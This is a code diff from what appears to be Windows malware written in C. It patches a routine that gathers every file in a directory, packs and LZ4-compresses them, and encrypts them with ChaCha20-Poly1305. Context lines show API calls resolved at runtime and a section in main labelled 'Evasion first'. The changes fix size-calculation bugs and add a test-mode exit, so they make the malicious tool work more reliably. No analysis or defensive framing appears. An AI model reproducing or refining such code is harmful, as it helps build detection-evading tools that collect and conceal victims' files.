@@ -148,7 +148,7 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
     do {
         if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
         size_t name_len = strlen(ffd.cFileName);
-        total += 4 + name_len + 4 + ffd.nFileSizeLow;
+        total += 4 + name_len + 4 + (size_t)ffd.nFileSizeLow + ((size_t)ffd.nFileSizeHigh << 32);
         file_count++;
     } while (g_main_find.pFN(hf, &ffd) != 0);
     g_main_find.pFC(hf);
@@ -203,18 +203,19 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
 #ifdef ENABLE_COMPRESSION
     /* LZ4-compress the packed TLV buffer before encryption */
     {
-        int comp_bound = lz4_compress_bound((int)off);
+        size_t packed_len = off;  /* snapshot: off won't change during compress */
+        int comp_bound = lz4_compress_bound((int)packed_len);
         unsigned char *comp = (unsigned char *)malloc((size_t)comp_bound + 5);
         if (comp) {
             int comp_len = lz4_compress((const char *)buf, (char *)(comp + 5),
-                                         (int)off, comp_bound);
-            if (comp_len > 0 && (size_t)comp_len < off) {
+                                         (int)packed_len, comp_bound);
+            if (comp_len > 0 && (size_t)comp_len < packed_len) {
                 comp[0] = 0x01; /* magic: LZ4 compressed */
                 /* Store original uncompressed size as LE uint32 */
-                comp[1] = (unsigned char)(off);
-                comp[2] = (unsigned char)(off >> 8);
-                comp[3] = (unsigned char)(off >> 16);
-                comp[4] = (unsigned char)(off >> 24);
+                comp[1] = (unsigned char)(packed_len);
+                comp[2] = (unsigned char)(packed_len >> 8);
+                comp[3] = (unsigned char)(packed_len >> 16);
+                comp[4] = (unsigned char)(packed_len >> 24);
                 free(buf);
                 buf = comp;
                 off = (size_t)comp_len + 5;
@@ -228,7 +229,7 @@ static unsigned char *pack_and_encrypt_dir(const char *dir, size_t *out_len) {
 #endif
 
     /* Encrypt with ChaCha20-Poly1305 via archive_crypt */
-    size_t enc_cap = total + 4 + 64; /* header + padding */
+    size_t enc_cap = off + 64; /* header + padding */
     unsigned char *enc = (unsigned char *)malloc(enc_cap);
     if (!enc) { free(buf); return NULL; }
 
@@ -422,7 +423,12 @@ static void save_text_to_file(const char *path, const char *text) {
 }
 
 int main(int argc, char *argv[]) {
-    (void)argc; (void)argv;
+#ifdef ZIALFI_TEST_MODE
+    if (argc > 1 && strcmp(argv[1], "--test") == 0) {
+        /* Internal self-test mode — no-op, CI uses external test binaries */
+        return 0;
+    }
+#endif
     if (!main_k32_ensure_api()) return 1;
 
     /* ── Evasion first ────────────────────────────────────── */
